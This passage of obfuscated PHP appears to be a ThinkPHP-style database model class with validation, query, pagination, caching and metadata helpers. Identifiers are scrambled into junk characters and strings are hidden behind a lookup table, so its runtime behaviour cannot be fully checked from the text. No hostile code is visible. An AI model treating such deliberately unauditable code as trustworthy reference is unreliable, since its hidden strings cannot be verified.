($È§‘ó…[0] as $ùôĞßëÕ) { $Ì”¦Ê°ó[$ùôĞßëÕ] = $½¾Õ‡İ[$ùôĞßëÕ]; } array_unshift($èÕ€Š×–, $Ì”¦Ê°ó); } else { array_unshift($èÕ€Š×–, $½¾Õ‡İ[$È§‘ó…[0]]); } if ($õğàİŸï[321] == $È§‘ó…[4]) { return call_user_func_array($È§‘ó…[1], $èÕ€Š×–); } else { return call_user_func_array(array(&$this, $È§‘ó…[1]), $èÕ€Š×–); } case $õğàİŸï[329]: return $½¾Õ‡İ[$È§‘ó…[0]] == $½¾Õ‡İ[$È§‘ó…[1]]; case $õğàİŸï[330]: if (is_string($È§‘ó…[0]) && strpos($È§‘ó…[0], $õğàİŸï[50])) { $È§‘ó…[0] = explode($õğàİŸï[50], $È§‘ó…[0]); } $¯¯åœ¸˜ = array(); if (is_array($È§‘ó…[0])) { foreach ($È§‘ó…[0] as $ùôĞßëÕ) { $¯¯åœ¸˜[$ùôĞßëÕ] = $½¾Õ‡İ[$ùôĞßëÕ]; } } else { $¯¯åœ¸˜[$È§‘ó…[0]] = $½¾Õ‡İ[$È§‘ó…[0]]; } if (!empty($½¾Õ‡İ[$this->getPk()])) { $¯¯åœ¸˜[$this->getPk()] = array($õğàİŸï[331], $½¾Õ‡İ[$this->getPk()]); } if ($this->where($¯¯åœ¸˜)->find()) { return !1; } return !0; default: return $this->check($½¾Õ‡İ[$È§‘ó…[0]], $È§‘ó…[1], $È§‘ó…[4]); } } public function check($úŞÈÊ»—, $şïë¼ê, $ÃïÔæ  = "\162\145\x67\145\170") { $æ³ãƒëù =& $_SERVER[³·—™¤¢]; $ÃïÔæ  = strtolower(trim($ÃïÔæ )); switch ($ÃïÔæ ) { case $æ³ãƒëù[7]: case $æ³ãƒëù[332]: $¼¼¼±£” = is_array($şïë¼ê) ? $şïë¼ê : explode($æ³ãƒëù[50], $şïë¼ê); return $ÃïÔæ  == $æ³ãƒëù[7] ? in_array($úŞÈÊ»—, $¼¼¼±£”) : !in_array($úŞÈÊ»—, $¼¼¼±£”); case $æ³ãƒëù[333]: case $æ³ãƒëù[334]: if (is_array($şïë¼ê)) { $ÀÚÜİÛé = $şïë¼ê[0]; $Åäë›®– = $şïë¼ê[1]; } else { list($ÀÚÜİÛé, $Åäë›®–) = explode($æ³ãƒëù[50], $şïë¼ê); } return $ÃïÔæ  == $æ³ãƒëù[333] ? $úŞÈÊ»— >= $ÀÚÜİÛé && $úŞÈÊ»— <= $Åäë›®– : $úŞÈÊ»— < $ÀÚÜİÛé || $úŞÈÊ»— > $Åäë›®–; case $æ³ãƒëù[335]: case $æ³ãƒëù[336]: return $ÃïÔæ  == $æ³ãƒëù[335] ? $úŞÈÊ»— == $şïë¼ê : $úŞÈÊ»— != $şïë¼ê; case $æ³ãƒëù[337]: $ãÑØë²ö = mb_strlen($úŞÈÊ»—, $æ³ãƒëù[338]); if (strpos($şïë¼ê, $æ³ãƒëù[50])) { list($ÀÚÜİÛé, $Åäë›®–) = explode($æ³ãƒëù[50], $şïë¼ê); return $ãÑØë²ö >= $ÀÚÜİÛé && $ãÑØë²ö <= $Åäë›®–; } else { return $ãÑØë²ö == $şïë¼ê; } case $æ³ãƒëù[339]: list($¿¢Ï¹‘’, $¶µŞÜˆß) = explode($æ³ãƒëù[50], $şïë¼ê); if (!is_numeric($¿¢Ï¹‘’)) { $¿¢Ï¹‘’ = strtotime($¿¢Ï¹‘’); } if (!is_numeric($¶µŞÜˆß)) { $¶µŞÜˆß = strtotime($¶µŞÜˆß); } return NOW_TIME >= $¿¢Ï¹‘’ && NOW_TIME <= $¶µŞÜˆß; case $æ³ãƒëù[340]: return in_array(get_client_ip(), explode($æ³ãƒëù[50], $şïë¼ê)); case $æ³ãƒëù[341]: return !in_array(get_client_ip(), explode($æ³ãƒëù[50], $şïë¼ê)); case $æ³ãƒëù[328]: default: return $this->regex($úŞÈÊ»—, $şïë¼ê); } } public function query($„Ö‰Ü‡Û, $Öô­­Ÿ› = false) { $ÏÀ‰™•… =& $_SERVER[³·—™¤¢]; if (!is_bool($Öô­­Ÿ›) && !is_array($Öô­­Ÿ›)) { $Öô­­Ÿ› = func_get_args(); array_shift($Öô­­Ÿ›); } $„Ö‰Ü‡Û = str_replace(array($ÏÀ‰™•…[231], $ÏÀ‰™•…[342]), $ÏÀ‰™•…[53], $„Ö‰Ü‡Û); $„Ö‰Ü‡Û = $this->parseSql($„Ö‰Ü‡Û, $Öô­­Ÿ›); return $this->db->query($„Ö‰Ü‡Û); } public function execute($Ç½è…šæ, $Òš³† Ğ = false) { if (!is_bool($Òš³† Ğ) && !is_array($Òš³† Ğ)) { $Òš³† Ğ = func_get_args(); array_shift($Òš³† Ğ); } $Ç½è…šæ = $this->parseSql($Ç½è…šæ, $Òš³† Ğ); return $this->db->execute($Ç½è…šæ); } protected function parseSql($Ú‰¹Ä¢, $±ğ‚»÷¯) { $¶°¶´ù =& $_SERVER[³·—™¤¢]; if (!0 === $±ğ‚»÷¯) { $øÎ®×‘ª = $this->_parseOptions(); $Ú‰¹Ä¢ = $this->db->parseSql($Ú‰¹Ä¢, $øÎ®×‘ª); } elseif (is_array($±ğ‚»÷¯)) { $±ğ‚»÷¯ = array_map(array($this->db, $¶°¶´ù[343]), $±ğ‚»÷¯); $Ú‰¹Ä¢ = vsprintf($Ú‰¹Ä¢, $±ğ‚»÷¯); } else { $Ú‰¹Ä¢ = strtr($Ú‰¹Ä¢, array($¶°¶´ù[344] => $this->getTableName(), $¶°¶´ù[345] => think_config($¶°¶´ù[244]))); } $this->db->setModel($this->name); return $Ú‰¹Ä¢; } public function db($ëè›ññ = '', $Åú’³ë‚ = '', $İÍŒŒŞ¼ = array()) { $±ÄõàÂ» =& $_SERVER[³·—™¤¢]; if ($±ÄõàÂ»[12] === $ëè›ññ && $this->db) { return $this->db; } static $¥ÆæŸò” = array(); static $şíøÚ÷ñ = array(); if (!isset($şíøÚ÷ñ[$ëè›ññ]) || isset($şíøÚ÷ñ[$ëè›ññ]) && $Åú’³ë‚ && $¥ÆæŸò”[$ëè›ññ] != $Åú’³ë‚) { if (!empty($Åú’³ë‚) && is_string($Åú’³ë‚) && !1 === strpos($Åú’³ë‚, $±ÄõàÂ»[8])) { $Åú’³ë‚ = think_config($Åú’³ë‚); } $ëè›ññ = think_guid($Åú’³ë‚); $şíøÚ÷ñ[$ëè›ññ] = Db::getInstance($Åú’³ë‚); } elseif (NULL === $Åú’³ë‚) { $şíøÚ÷ñ[$ëè›ññ]->close(); unset($şíøÚ÷ñ[$ëè›ññ]); return; } if (!empty($İÍŒŒŞ¼)) { if (is_string($İÍŒŒŞ¼)) { parse_str($İÍŒŒŞ¼, $İÍŒŒŞ¼); } foreach ($İÍŒŒŞ¼ as $ÎØ†íë => $äŒÔ‰Š) { $this->setProperty($ÎØ†íë, $äŒÔ‰Š); } } $¥ÆæŸò”[$ëè›ññ] = $Åú’³ë‚; $this->db = $şíøÚ÷ñ[$ëè›ññ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $û®ƒøÄ = get_class($this); if ($û®ƒøÄ == $_SERVER[³·—™¤¢][346]) { return $this->name; } $this->name = substr($û®ƒøÄ, 0, -5); } return $this->name; } public function getTableName() { $çø²·äò =& $_SERVER[³·—™¤¢]; if (empty($this->trueTableName)) { $£˜È…í = !empty($this->tablePrefix) ? $this->tablePrefix : $çø²·äò[12]; if (!empty($this->tableName)) { $£˜È…í .= $this->tableName; } else { $£˜È…í .= think_parse_name($this->name); } $this->trueTableName = strtolower($£˜È…í); } return (!empty($this->dbName) ? $this->dbName . $çø²·äò[10] : $çø²·äò[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $èà¿¦‹ =& $_SERVER[³·—™¤¢]; return isset($this->fields[$èà¿¦‹[251]]) ? $this->fields[$èà¿¦‹[251]] : $this->pk; } public function getDbFields() { $Œ·­â¾ö =& $_SERVER[³·—™¤¢]; if (isset($this->options[$Œ·­â¾ö[279]])) { $ãÄ¿²Ëì = $this->db->getFields($this->options[$Œ·­â¾ö[279]]); return $ãÄ¿²Ëì ? array_keys($ãÄ¿²Ëì) : !1; } if ($this->fields) { $ãÄ¿²Ëì = $this->fields; unset($ãÄ¿²Ëì[$Œ·­â¾ö[250]], $ãÄ¿²Ëì[$Œ·­â¾ö[251]], $ãÄ¿²Ëì[$Œ·­â¾ö[252]], $ãÄ¿²Ëì[$Œ·­â¾ö[249]]); return $ãÄ¿²Ëì; } return !1; } public function data($Øû¼ÃõÅ = '') { $Ä°ÛÎ†Ù =& $_SERVER[³·—™¤¢]; if ($Ä°ÛÎ†Ù[12] === $Øû¼ÃõÅ && !empty($this->data)) { return $this->data; } if (is_object($Øû¼ÃõÅ)) { $Øû¼ÃõÅ = get_object_vars($Øû¼ÃõÅ); } elseif (is_string($Øû¼ÃõÅ)) { parse_str($Øû¼ÃõÅ, $Øû¼ÃõÅ); } elseif (!is_array($Øû¼ÃõÅ)) { think_exception(think_lang($Ä°ÛÎ†Ù[271])); } $this->data = $Øû¼ÃõÅ; return $this; } public function join($İèÜ‘¤é) { $ßÀÎ°Ë =& $_SERVER[³·—™¤¢]; if (is_array($İèÜ‘¤é)) { $this->options[$ßÀÎ°Ë[282]] = $İèÜ‘¤é; } elseif (!empty($İèÜ‘¤é)) { $this->options[$ßÀÎ°Ë[282]][] = $İèÜ‘¤é; } return $this; } public function union($¡ÓÔ­’ü, $ÇÚºÛïÈ = false) { $¾¡íÀ£ø =& $_SERVER[³·—™¤¢]; if (empty($¡ÓÔ­’ü)) { return $this; } if ($ÇÚºÛïÈ) { $this->options[$¾¡íÀ£ø[347]][$¾¡íÀ£ø[348]] = !0; } if (is_object($¡ÓÔ­’ü)) { $¡ÓÔ­’ü = get_object_vars($¡ÓÔ­’ü); } if (is_string($¡ÓÔ­’ü)) { $º†¨é‚½ = $¡ÓÔ­’ü; } elseif (is_array($¡ÓÔ­’ü)) { if (isset($¡ÓÔ­’ü[0])) { $this->options[$¾¡íÀ£ø[347]] = array_merge($this->options[$¾¡íÀ£ø[347]], $¡ÓÔ­’ü); return $this; } else { $º†¨é‚½ = $¡ÓÔ­’ü; } } else { think_exception(think_lang($¾¡íÀ£ø[271])); } $this->options[$¾¡íÀ£ø[347]][] = $º†¨é‚½; return $this; } public function cache($Ù‰Œ‹²‡ = true, $™ú™í°‘ = null, $ÂÆ“Èñ” = '') { $×‰–™üÑ =& $_SERVER[³·—™¤¢]; if (!1 !== $Ù‰Œ‹²‡) { $this->options[$×‰–™üÑ[349]] = array($×‰–™üÑ[94] => $Ù‰Œ‹²‡, $×‰–™üÑ[339] => $™ú™í°‘, $×‰–™üÑ[33] => $ÂÆ“Èñ”); } return $this; } public function field($†Û›Áñ», $èŸø‡üÈ = false) { $éç·ÔØ =& $_SERVER[³·—™¤¢]; if (!0 === $†Û›Áñ») { $¯·ÛŒ·ã = $this->getDbFields(); $†Û›Áñ» = $¯·ÛŒ·ã ? $¯·ÛŒ·ã : $éç·ÔØ[188]; } elseif ($èŸø‡üÈ) { if (is_string($†Û›Áñ»)) { $†Û›Áñ» = explode($éç·ÔØ[50], $†Û›Áñ»); } $¯·ÛŒ·ã = $this->getDbFields(); $†Û›Áñ» = $¯·ÛŒ·ã ? array_diff($¯·ÛŒ·ã, $†Û›Áñ») : $†Û›Áñ»; } $this->options[$éç·ÔØ[273]] = $†Û›Áñ»; return $this; } public function scope($é¡ä†Ğ = '', $¨ï«éé = NULL) { $Ç×çÛ“æ =& $_SERVER[³·—™¤¢]; if ($Ç×çÛ“æ[12] === $é¡ä†Ğ) { if (isset($this->_scope[$Ç×çÛ“æ[37]])) { $°Òæ¥â¢ = $this->_scope[$Ç×çÛ“æ[37]]; } else { return $this; } } elseif (is_string($é¡ä†Ğ)) { $ñ¤¹å = explode($Ç×çÛ“æ[50], $é¡ä†Ğ); $°Òæ¥â¢ = array(); foreach ($ñ¤¹å as $Úàµ¿Ûî) { if (!isset($this->_scope[$Úàµ¿Ûî])) { continue; } $°Òæ¥â¢ = array_merge($°Òæ¥â¢, $this->_scope[$Úàµ¿Ûî]); } if (!empty($¨ï«éé) && is_array($¨ï«éé)) { $°Òæ¥â¢ = array_merge($°Òæ¥â¢, $¨ï«éé); } } elseif (is_array($é¡ä†Ğ)) { $°Òæ¥â¢ = $é¡ä†Ğ; } if (is_array($°Òæ¥â¢) && !empty($°Òæ¥â¢)) { $this->options = array_merge($this->options, array_change_key_case($°Òæ¥â¢)); } return $this; } public function where($„ÅéÃè÷, $ô¢Œ© = null) { $³È¡âºÜ =& $_SERVER[³·—™¤¢]; if (!is_null($ô¢Œ©) && is_string($„ÅéÃè÷)) { if (!is_array($ô¢Œ©)) { $ô¢Œ© = func_get_args(); array_shift($ô¢Œ©); } $ô¢Œ© = array_map(array($this->db, $³È¡âºÜ[343]), $ô¢Œ©); $„ÅéÃè÷ = vsprintf($„ÅéÃè÷, $ô¢Œ©); } elseif (is_object($„ÅéÃè÷)) { $„ÅéÃè÷ = get_object_vars($„ÅéÃè÷); } elseif (is_array($„ÅéÃè÷)) { foreach ($„ÅéÃè÷ as $¹ÊÓõÅ£ => $À‡ğØÊ) { if ((is_numeric($¹ÊÓõÅ£) || !$¹ÊÓõÅ£) && is_string($À‡ğØÊ)) { if (strpos($À‡ğØÊ, $³È¡âºÜ[350]) === 0) { continue; } think_trace($³È¡âºÜ[351], $³È¡âºÜ[12], $³È¡âºÜ[49]); die; } } } if (is_string($„ÅéÃè÷) && $³È¡âºÜ[12] != $„ÅéÃè÷) { $‚óŠÄ¢¤ = array(); $‚óŠÄ¢¤[$³È¡âºÜ[352]] = $„ÅéÃè÷; $„ÅéÃè÷ = $‚óŠÄ¢¤; } if (isset($this->options[$³È¡âºÜ[275]])) { $this->options[$³È¡âºÜ[275]] = array_merge($this->options[$³È¡âºÜ[275]], $„ÅéÃè÷); } else { $this->options[$³È¡âºÜ[275]] = $„ÅéÃè÷; } return $this; } public function limit($‹›ÙÁ‚®, $ÍÏæ÷’ = null) { $¼çêñÅ =& $_SERVER[³·—™¤¢]; $this->options[$¼çêñÅ[292]] = is_null($ÍÏæ÷’) ? $‹›ÙÁ‚® : $‹›ÙÁ‚® . $¼çêñÅ[50] . $ÍÏæ÷’; return $this; } public function page($¥³¨¥ş, $Àıéˆêš = null) { $ƒ¼Ó½ÀÛ =& $_SERVER[³·—™¤¢]; $this->options[$ƒ¼Ó½ÀÛ[353]] = is_null($Àıéˆêš) ? $¥³¨¥ş : $¥³¨¥ş . $ƒ¼Ó½ÀÛ[50] . $Àıéˆêš; return $this; } public function comment($¦ŞÁÚ º) { $this->options[$_SERVER[³·—™¤¢][354]] = $¦ŞÁÚ º; return $this; } public function setProperty($ıõè Œµ, $ëîÏæÂô) { if (property_exists($this, $ıõè Œµ)) { $this->{$ıõè Œµ} = $ëîÏæÂô; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\x69\x6d\x65", "\164\x69\155\x65", "\x69\156\x73\x65\162\164\54\x75\160\144\x61\x74\145", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\143\x72\145\x61\x74\x65\124\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\x72\164", "\x66\x75\156\x63\x74\x69\x6f\156")); public function setDataAuto($ôÅÌÏ½Ç) { $this->dataAuto = $ôÅÌÏ½Ç; } public function __construct($•ÒüÒòç = '', $ÌÌ†­»ã = '', $™øÙÚè¸ = '') { parent::__construct($•ÒüÒòç, $ÌÌ†­»ã, $™øÙÚè¸); } protected $tableMeta = array(); protected function _beforeInsert(&$åëõ›¹š, $¬šÈğ®Ã) { $…ªòßîº =& $_SERVER[³·—™¤¢]; if (!$this->checkDataAutoHas($…ªòßîº[355])) { return; } $this->dataBeforeFilter($åëõ›¹š, $…ªòßîº[355]); } protected function _beforeUpdate(&$¿•»¤Äª, $óõîú ”) { $ª¶äÆò =& $_SERVER[³·—™¤¢]; if (!$this->checkDataAutoHas($ª¶äÆò[356])) { return; } $this->dataBeforeFilter($¿•»¤Äª, $ª¶äÆò[356]); } protected function _afterSelect(&$·è”—ùâ, $ç•Û©‹è) { if (!is_array($·è”—ùâ)) { return; } if (!$this->checkDataAutoHas($_SERVER[³·—™¤¢][357])) { return; } foreach ($·è”—ùâ as &$ÏÏÏÁû¤) { $this->dataAfterFilter($ÏÏÏÁû¤); } unset($ÏÏÏÁû¤); } protected function _afterFind(&$«¿‡•µ», $ÒÍ³‹¯) { if (!is_array($«¿‡•µ»)) { return; } if (!$this->checkDataAutoHas($_SERVER[³·—™¤¢][357])) { return; } $this->dataAfterFilter($«¿‡•µ»); } public static function textEncode($ºì°äÎû) { if (!$ºì°äÎû) { return $ºì°äÎû; } $Ü«‡ßŠ± = json_encode($ºì°äÎû); $Ü«‡ßŠ± = preg_replace_callback($_SERVER[³·—™¤¢][358], function ($Ş¸ÈÏû“) { return addslashes($Ş¸ÈÏû“[0]); }, $Ü«‡ßŠ±); return json_decode($Ü«‡ßŠ±); } public static function textDecode($ˆÀƒ®Æ) { $¬ †À =& $_SERVER[³·—™¤¢]; $ÆÂîê°à = json_encode($ˆÀƒ®Æ); $ÆÂîê°à = preg_replace_callback($¬ †À[359], function ($ŞÎ¼€úÅ) { return $_SERVER[³·—™¤¢][97]; }, $ÆÂîê°à); return json_decode($ÆÂîê°à); } public function setAutoIncrement($é“öÆÁ) { $É¸‡‘»º = array($this->getPk() => $é“öÆÁ); $·‡¢—®Ê = $this->data($É¸‡‘»º)->add(); if ($·‡¢—®Ê) { $this->delete($·‡¢—®Ê); } } public function getAutoIncrement() { $¤˜Ó´ı¯ = $this->getTableName(); $˜æ›Ïøå = $this->max($this->getPk()); $´ÔªËÈ³ = $this->query("\x73\x68\157\x77\40\x74\x61\142\x6c\145\x20\x73\164\141\164\165\163\40\167\x68\x65\162\145\x20\116\141\x6d\145\x3d\47{$¤˜Ó´ı¯}\47"); $‹‰‚úâ¯ = $´ÔªËÈ³[0][$_SERVER[³·—™¤¢][360]]; $ß’ˆ•Ø = max($˜æ›Ïøå, $‹‰‚úâ¯); return $ß’ˆ•Ø; } protected function _callBefore($¿€äƒÛÍ, $²Ñ¢Èí) { return $this->cacheCallCheck($¿€äƒÛÍ, $²Ñ¢Èí, !1); } protected function _callAfter($¹™ê¬ò°, $ÖøÂšµé) { return $this->cacheCallCheck($¹™ê¬ò°, $ÖøÂšµé, !0); } protected function cacheFunctionAlias($‘‚äè¯É) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($çÁ£½ºœ, $Ò™ĞÀöÈ, $„ÖÛàŸÈ = false) { $ø½“‚ôï = $this->cacheFunctionAlias($Ò™ĞÀöÈ); if (!$ø½“‚ôï) { return; } foreach ($ø½“‚ôï as $®©âï‘í => $ûßÊìá) { $å”Ş§ß¶ = $ûßÊìá[0]; $åü¨œ = explode($_SERVER[³·—™¤¢][50], $ûßÊìá[1]); if ($çÁ£½ºœ == $®©âï‘í) { return $this->cacheFunctionGet($®©âï‘í, $å”Ş§ß¶); } if ($„ÖÛàŸÈ && in_array($çÁ£½ºœ, $åü¨œ)) { $this->cacheFunctionClear($®©âï‘í, $å”Ş§ß¶); } } } public function cacheFunctionGet($°£‰Üê¥, $ê§§ùÉñ) { $†÷¾Íß© = $this->cacheKeyMake($°£‰Üê¥, $ê§§ùÉñ); $¤ÎØÑÀ¶ = Cache::get($†÷¾Íß©); if (!is_array($¤ÎØÑÀ¶)) { $¤ÎØÑÀ¶ = call_user_func_array(array($this, $°£‰Üê¥), array($ê§§ùÉñ, !0)); Cache::set($†÷¾Íß©, $¤ÎØÑÀ¶); } return $¤ÎØÑÀ¶; } public function cacheFunctionClear($„Ó˜çƒº, $÷ôª¸«“) { $ŒÃ†û£û = $÷ôª¸«“; if (!is_array($÷ôª¸«“)) { $ŒÃ†û£û = array($÷ôª¸«“); } foreach ($ŒÃ†û£û as $éõ­·öñ) { $¨ùğâñ“ = $this->cacheKeyMake($„Ó˜çƒº, $éõ­·öñ); Cache::remove($¨ùğâñ“); } } private function cacheKeyMake($Šú±’ûé, $±›¡Øæ“) { $ç²Èõ€• =& $_SERVER[³·—™¤¢]; return get_class($this) . $ç²Èõ€•[11] . $Šú±’ûé . $ç²Èõ€•[361] . $±›¡Øæ“; } protected function selectPageReset() { $İâ§ø„° =& $_SERVER[³·—™¤¢]; if (isset($GLOBALS[$İâ§ø„°[362]])) { return; } $GLOBALS[$İâ§ø„°[362]] = isset($GLOBALS[$İâ§ø„°[7]][$İâ§ø„°[363]]) ? $GLOBALS[$İâ§ø„°[7]][$İâ§ø„°[363]] : !1; $GLOBALS[$İâ§ø„°[364]] = isset($GLOBALS[$İâ§ø„°[7]][$İâ§ø„°[353]]) ? $GLOBALS[$İâ§ø„°[7]][$İâ§ø„°[353]] : !1; $GLOBALS[$İâ§ø„°[7]][$İâ§ø„°[363]] = !1; $GLOBALS[$İâ§ø„°[7]][$İâ§ø„°[353]] = !1; } protected function selectPageRestore() { $—Şàİ›‹ =& $_SERVER[³·—™¤¢]; if (!isset($GLOBALS[$—Şàİ›‹[362]])) { return; } $GLOBALS[$—Şàİ›‹[7]][$—Şàİ›‹[363]] = $GLOBALS[$—Şàİ›‹[362]]; $GLOBALS[$—Şàİ›‹[7]][$—Şàİ›‹[353]] = $GLOBALS[$—Şàİ›‹[364]]; if ($GLOBALS[$—Şàİ›‹[7]][$—Şàİ›‹[363]] === !1) { unset($GLOBALS[$—Şàİ›‹[7]][$—Şàİ›‹[363]]); } if ($GLOBALS[$—Şàİ›‹[7]][$—Şàİ›‹[353]] === !1) { unset($GLOBALS[$—Şàİ›‹[7]][$—Şàİ›‹[353]]); } unset($GLOBALS[$—Şàİ›‹[362]]); unset($GLOBALS[$—Şàİ›‹[364]]); } protected function selectPage($¯ğª—œ = 200, $„ó£Íä = 1) { $ÇˆµÌ¯ =& $_SERVER[³·—™¤¢]; global $in; $ÆƒŞÎ§‡ = $this->optionsValue(); $éÈàß–˜ = 50000; $¯ğª—œ = isset($in[$ÇˆµÌ¯[363]]) && $in[$ÇˆµÌ¯[363]] ? $in[$ÇˆµÌ¯[363]] : $¯ğª—œ; if ($¯ğª—œ === -1) { $in[$ÇˆµÌ¯[363]] = !1; $éÈàß–˜ = 100000000; $¯ğª—œ = $éÈàß–˜; } $Á¤ìã¿Ç = $ÆƒŞÎ§‡; $Á¤ìã¿Ç[$ÇˆµÌ¯[365]] = array(); $¯ğª—œ = intval($¯ğª—œ); $¯ğª—œ = $¯ğª—œ <= 5 ? 5 : ($¯ğª—œ >= $éÈàß–˜ ? $éÈàß–˜ : $¯ğª—œ); $„ó£Íä = intval(isset($in[$ÇˆµÌ¯[353]]) && $in[$ÇˆµÌ¯[353]] ? $in[$ÇˆµÌ¯[353]] : $„ó£Íä); $„ó£Íä = $„ó£Íä <= 1 ? 1 : $„ó£Íä; $¬ú™Î”ä = array(); $ç¨ ¢¹˜ = 1; if ($„ó£Íä == 1 && $ç¨ ¢¹˜) { $this->optionsValue($ÆƒŞÎ§‡); $¬ú™Î”ä = $this->page($„ó£Íä, $¯ğª—œ)->select(); $“œ‡ë¾è = is_array($¬ú™Î”ä) ? count($¬ú™Î”ä) : 0; if ($“œ‡ë¾è < $¯ğª—œ) { $‹ÅÁ”÷¨ = 1; } else { $this->optionsValue($Á¤ìã¿Ç); $“œ‡ë¾è = intval($this->count()); $‹ÅÁ”÷¨ = ceil($“œ‡ë¾è / $¯ğª—œ); } } else { $this->optionsValue($Á¤ìã¿Ç); $“œ‡ë¾è = intval($this->count()); $‹ÅÁ”÷¨ = ceil($“œ‡ë¾è / $¯ğª—œ); $„ó£Íä = $„ó£Íä >= $‹ÅÁ”÷¨ ? $‹ÅÁ”÷¨ : $„ó£Íä; $this->optionsValue($ÆƒŞÎ§‡); $¬ú™Î”ä = $this->page($„ó£Íä, $¯ğª—œ)->select(); } if (!is_array($¬ú™Î”ä)) { $¬ú™Î”ä = array(); } if ($‹ÅÁ”÷¨ == 1) { $“œ‡ë¾è = count($¬ú™Î”ä); } $ñ‚…Ğßª = array($ÇˆµÌ¯[366] => array($ÇˆµÌ¯[367] => $“œ‡ë¾è, $ÇˆµÌ¯[363] => $¯ğª—œ, $ÇˆµÌ¯[353] => $„ó£Íä, $ÇˆµÌ¯[368] => $‹ÅÁ”÷¨), $ÇˆµÌ¯[369] => $¬ú™Î”ä); return $ñ‚…Ğßª; } protected function checkLength($Ã°¯·Š, $³çÀóŞ = 0, $Î½²ğÉâ = '') { $ŸİãüÕ =& $_SERVER[³·—™¤¢]; $³çÀóŞ = $³çÀóŞ ? $³çÀóŞ : 65536; if (!$Ã°¯·Š || strlen($Ã°¯·Š) < $³çÀóŞ) { return; } $Î½²ğÉâ = $Î½²ğÉâ ? $Î½²ğÉâ . $ŸİãüÕ[71] : $ŸİãüÕ[12]; show_json($Î½²ğÉâ . LNG($ŸİãüÕ[370]) . "\50{$³çÀóŞ}\51", !1); } protected function metaSet($ú«‹‘Ğ™, $ìÌ¨Ä€é = null, $ûš¨á™‹ = null) { $‡¾ôÒÇ¶ =& $_SERVER[³·—™¤¢]; if (!$this->tableMeta || !$ú«‹‘Ğ™) { return !1; } $áÜı÷ˆ = $this->tableMeta[$‡¾ôÒÇ¶[371]]; $ŸƒËëØË = $this->tableMeta[$‡¾ôÒÇ¶[372]]; $—Ûœ©ü£ = Model($ŸƒËëØË); $¼²É¿Â = array($áÜı÷ˆ => $ú«‹‘Ğ™, $‡¾ôÒÇ¶[373] => $ìÌ¨Ä€é); if (is_null($ìÌ¨Ä€é)) { return $—Ûœ©ü£->where(array($áÜı÷ˆ => $ú«‹‘Ğ™))->delete(); } if (is_null($ûš¨á™‹) && is_string($ìÌ¨Ä€é)) { return $—Ûœ©ü£->where($¼²É¿Â)->delete(); } $‹ëÆ®˜¡ = is_array($ìÌ¨Ä€é) ? $ìÌ¨Ä€é : array(); if (is_string($ìÌ¨Ä€é)) { $‹ëÆ®˜¡[$ìÌ¨Ä€é] = $ûš¨á™‹; } $¡é¶åË² = array(); foreach ($‹ëÆ®˜¡ as $ì©àÜİè => $ÏÀ¦œÏµ) { if (is_null($ÏÀ¦œÏµ) && is_string($ì©àÜİè)) { $—Ûœ©ü£->where(array($áÜı÷ˆ => $ú«‹‘Ğ™, $‡¾ôÒÇ¶[373] => $ì©àÜİè))->delete(); continue; } $this->checkLength($ÏÀ¦œÏµ, !1, $ŸƒËëØË . $‡¾ôÒÇ¶[4] . $ì©àÜİè); $¡é¶åË²[] = array($áÜı÷ˆ => $ú«‹‘Ğ™, $‡¾ôÒÇ¶[94] => $ì©àÜİè, $‡¾ôÒÇ¶[374] => $ÏÀ¦œÏµ); } $õ˜¯Ö«Œ = $‡¾ôÒÇ¶[375] . $ŸƒËëØË; CacheLock::lock($õ˜¯Ö«Œ); $—Ûœ©ü£->where(array($áÜı÷ˆ => $ú«‹‘Ğ™))->addAll($¡é¶åË², array(), !0); CacheLock::unlock($õ˜¯Ö«Œ); return !0; } public function metaGet($´ĞêæÜ , $Ï‚îæÙ = false) { $¨Ä¼Ôığ =& $_SERVER[³·—™¤¢]; if (!$this->tableMeta) { return array(); } $šÀ©ˆ¼µ = $this->tableMeta[$¨Ä¼Ôığ[371]]; $ªËá¨È„ = Model($this->tableMeta[$¨Ä¼Ôığ[372]]); if ($Ï‚îæÙ) { $õãÓ‰Ñè = array($šÀ©ˆ¼µ => $´ĞêæÜ , $¨Ä¼Ôığ[94] => $Ï‚îæÙ); return $ªËá¨È„->where($õãÓ‰Ñè)->getField($¨Ä¼Ôığ[374]); } $õãÓ‰Ñè = array($šÀ©ˆ¼µ => $´ĞêæÜ ); $¥êŸäÕã = $ªËá¨È„->field($¨Ä¼Ôığ[376])->where($õãÓ‰Ñè)->select(); $¥êŸäÕã = array_to_keyvalue($¥êŸäÕã, $¨Ä¼Ôığ[94], $¨Ä¼Ôığ[374]); return $¥êŸäÕã; } private function checkDataAutoHas($éÛ… ù±) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $³¤Õ¨€) { if (in_array($éÛ… ù±, explode($_SERVER[³·—™¤¢][50], $³¤Õ¨€[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$³ı¨ÍÖâ, $½ òÍˆ) { $‰•Äà„Ù =& $_SERVER[³·—™¤¢]; if (!is_array($³ı¨ÍÖâ)) { return; } foreach ($this->dataAuto as $•ÅÍíØ) { $í¿à¢ŞÔ = $•ÅÍíØ[0]; if (!in_array($½ òÍˆ, explode($‰•Äà„Ù[50], $•ÅÍíØ[2]))) { continue; } switch (trim($•ÅÍíØ[3])) { case $‰•Äà„Ù[321]: case $‰•Äà„Ù[322]: $˜ûËŸáµ = $•ÅÍíØ[1]; $®š¤× = isset($•ÅÍíØ[4]) ? (array) $•ÅÍíØ[4] : array(); if ($˜ûËŸáµ == $‰•Äà„Ù[203] && array_key_exists($í¿à¢ŞÔ, $³ı¨ÍÖâ)) { if (!$³ı¨ÍÖâ[$í¿à¢ŞÔ]) { unset($³ı¨ÍÖâ[$í¿à¢ŞÔ]); } break; } if (isset($³ı¨ÍÖâ[$í¿à¢ŞÔ])) { 